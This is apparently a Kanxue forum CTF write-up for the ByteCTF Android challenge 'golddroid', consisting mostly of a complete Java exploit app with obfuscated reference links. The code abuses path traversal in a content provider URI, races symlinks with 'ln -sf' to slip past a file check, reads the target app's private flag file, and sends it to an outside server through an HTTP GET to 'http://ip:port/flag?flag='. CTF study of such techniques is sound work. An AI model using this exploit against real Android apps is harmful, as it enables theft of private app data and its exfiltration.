
```java
package com.bytectf.pwngolddroid;

import androidx.appcompat.app.AppCompatActivity;
import android.content.ContentResolver;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    String symlink;

    public void httpGet(String msg) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection connection = null;
                BufferedReader reader = null;
                try {
                    Log.e("in_httpGet","inHttpGet1");
                    URL url = new URL("http://ip:port/flag?flag=" + msg);
                    //这里可以写自己博客的ip和端口，对其进行访问，然后查看日志，我的日志在/var/log/nginx/access.log
                    Thread.sleep(1);
                    Log.e("in_httpGet","inHttpGet2");
                    connection = (HttpURLConnection) url.openConnection();
                    Thread.sleep(1);
                    Log.e("in_httpGet","inHttpGet3");
                    connection.setRequestMethod("GET");
                    Thread.sleep(1);
                    Log.e("in_httpGet","inHttpGet4");
                    connection.getInputStream();
                    Thread.sleep(1);
                    Log.e("httpget succeed","http_get succeed");
                } catch (IOException | InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private String readUri(Uri uri) {
        InputStream inputStream = null;
        try {
            ContentResolver contentResolver = getContentResolver();
            inputStream = contentResolver.openInputStream(uri);
            if (inputStream != null) {
                byte[] buffer = new byte[1024];
                int result;
                String content = "";
                while ((result = inputStream.read(buffer)) != -1) {
                    content = content.concat(new String(buffer, 0, result));
                }
                return content;
            }
        } catch (IOException e) {
            Log.e("receiver", "IOException when reading uri", e);
        } catch (IllegalArgumentException e) {
            Log.e("receiver", "IllegalArgumentException", e);
        } finally {
            if (inputStream != null) {
                try {
                    inputStream.close();
                } catch (IOException e) {
                    Log.e("receiver", "IOException when closing stream", e);
                }
            }
        }
        return null;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        String root = getApplicationInfo().dataDir;
        symlink = root + "/symlink";
        try {
            Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();
        } catch (InterruptedException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

        String path = "content://slipme/" + "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F" + "data%2Fdata%2Fcom.bytectf.pwngolddroid%2Fsymlink";
        //String path = "content://slipme/sdcard/Android/data/com.bytectf.golddroid/files/sandbox/file1";
        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(1);
                    Runtime.getRuntime().exec("ln -sf /sdcard/Android/data/com.bytectf.golddroid/files/sandbox/file1 " + symlink).waitFor();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(1);
                    Runtime.getRuntime().exec("ln -sf /data/data/com.bytectf.golddroid/files/flag " + symlink).waitFor();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(10);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                String data = readUri(Uri.parse(path));
                if(data.length()>0){
                    Log.e("has_data",data);
                    httpGet(data);
                }

            }
        }).start();
    }
}
```

![](https://bbs.kanxue.com/upload/attach/202212/922338_979XKSN22YFFYHF.png)

本地拿到flag，也可以翻日志看

题目链接：链接: 3aaK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3j5h3&6Q4x3X3g2T1j5h3W2V1N6g2)9J5k6h3y4G2L8g2)9J5c8Y4y4Q4x3V1j5I4P5r3k6C8z5p5@1J5g2r3!0q4K9W2u0F1x3s2y4D9k6r3E0g2b7W2A6#2b7b7`.`. 提取码: eeee

参考链接：

- bf2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2N6$3#2Q4x3X3c8@1k6h3q4E0i4K6u0W2j5$3&6Q4x3V1k6A6L8X3c8W2P5q4)9J5k6i4m8Z5M7q4)9J5c8X3q4J5j5$3S2A6N6X3g2K6i4K6u0r3x3U0S2Q4x3V1j5`.
- 8dbK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3N6A6N6s2W2#2j5h3&6Q4x3X3g2U0L8$3#2Q4x3V1j5J5x3o6p5$3i4K6u0r3x3o6u0Q4x3V1j5J5y4#2)9J5c8X3q4E0i4K6u0V1j5$3!0E0L8h3q4F1k6q4)9J5c8R3`.`.
- 122K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8W2m8S2L8r3#2W2M7U0W2Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0p5J5x3U0b7J5x3o6M7H3y4H3`.`.
- acbK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1P5i4c8W2k6r3q4F1j5$3g2Q4x3X3g2X3k6h3W2K6K9s2g2Q4x3X3g2U0L8W2)9J5c8X3c8G2j5%4S2Q4x3V1k6V1L8%4S2U0L8W2N6E0N6r3E0u0d9i4c8J5c8$3!0C8j5$3E0X3L8K6q4H3N6f1u0@1b7$3R3`.
- 28eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6B7N6h3g2B7K9h3&6Q4x3X3g2U0L8W2)9J5c8Y4m8G2M7%4c8Q4x3V1j5$3z5o6b7@1z5e0l9K6z5e0x3^5y4K6V1H3x3o6p5@1z5e0V1H3
- 331K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6K9s2k6#2z5r3f1H3k6K6N6#2i4K6u0W2k6X3g2A6M7$3S2#2i4K6u0W2j5$3&6Q4x3V1k6V1L8$3y4K6i4K6u0r3k6r3!0U0j5$3&6V1h3i4W2Y4d9i4N6A6M7%4u0C8x3p5k6s2d9$3&6w2N6V1f1H3d9X3S2Y4
- cdfK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6N6i4m8H3L8%4u0@1i4K6u0W2k6$3!0G2k6$3I4W2i4K6u0W2j5$3!0E0i4K6u0r3k6X3q4I4M7#2)9J5c8X3q4F1M7%4N6W2M7W2)9J5c8U0M7@1z5e0j5&6x3e0x3`.

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)

最后于 2022-12-2 21:58 被kanxue编辑，原因：

- [#基础理论](https://bbs.kanxue.com/forum-161-1-117.htm)
- [#逆向分析](https://bbs.kanxue.com/forum-161-1-118.htm)
- [#漏洞相关](https://bbs.kanxue.com/forum-161-1-123.htm)
- [#其他](https://bbs.kanxue.com/forum-161-1-129.htm)

上传的附件：

- [归档.zip](javascript:void(0);)

  （11.34MB，38次下载）
